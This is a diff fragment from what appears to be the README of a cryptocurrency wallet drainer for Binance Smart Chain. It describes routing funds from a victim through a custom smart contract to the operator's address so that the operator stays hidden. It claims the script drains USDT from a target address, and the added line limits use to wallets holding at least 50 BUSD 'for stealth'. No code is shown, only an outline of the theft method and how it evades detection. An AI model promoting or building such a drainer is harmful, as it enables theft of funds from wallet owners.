@@ -20,6 +20,9 @@ HOW IT WORKS
 
 VICTIM ----> CUSTOM SMART CONTRACT -----> YOUR BSC ADDRESS
 
+!!!!!!!!! This only will work with wallets that have 50 busd or more for stealth !!!!!!!!!
+
+
 The !!! smart contract address !!! appears in the transaction not yours this is for stealth
 
 This script will let you drain usdt from the target address
